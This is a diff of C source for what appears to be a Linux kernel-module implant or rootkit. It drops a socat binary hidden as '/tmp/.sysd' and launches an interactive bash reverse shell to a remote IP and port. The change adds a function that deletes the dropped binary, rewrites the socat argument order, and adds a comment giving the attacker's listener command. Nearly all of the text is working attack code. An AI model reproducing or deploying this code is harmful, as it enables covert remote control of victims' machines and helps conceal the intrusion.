@@ -62,23 +62,34 @@ int drop_socat_binaire(void){
 	return SUCCESS;
 }
 
+int remove_socat_binaire(void){
+	exec_str_as_command("rm -f " SOCAT_BINARY_PATH, false);
+	if (is_socat_binaire_dropped()) {
+		DBG_MSG("remove_socat_binaire: failed to remove socat binary\n");
+		return -FAILURE;
+	}
+	DBG_MSG("remove_socat_binaire: socat binary removed successfully\n");
+	return SUCCESS;
+}
+
 // Fonction pour gérer la fin du processus
 static int socat_task_fn(void *data) {
     int ret;
 
     char ip_port[32];
-	snprintf(ip_port, sizeof(ip_port), "TCP:%s:%d", ip, REVERSE_SHELL_PORT);
+	snprintf(ip_port, sizeof(ip_port), "tcp:%s:%d", ip, REVERSE_SHELL_PORT);
 
 	char *argv[] = {
 		"/tmp/.sysd",
+		"exec:'bash -i',pty,stderr,setsid,sigint,sane",
 		ip_port,
-		"EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
 		NULL
 	};
 
     char *envp[] = {
         "HOME=/",
         "PATH=/usr/bin:/bin:/usr/sbin:/sbin:/tmp",
+		"TERM=xterm",
         NULL
     };
 
@@ -100,6 +111,13 @@ static int socat_task_fn(void *data) {
 }
 
 int launch_reverse_shell(void){
+	// use socat file:"$(tty)",raw,echo=0 tcp-listen:9001 to launch server
+	
+	if (!is_socat_binaire_dropped()) {
+		DBG_MSG("launch_reverse_shell: socat binary not dropped\n");
+		return -FAILURE;
+	}
+
     // Initialisation de la structure de synchronisation
     init_completion(&socat_completion);
 
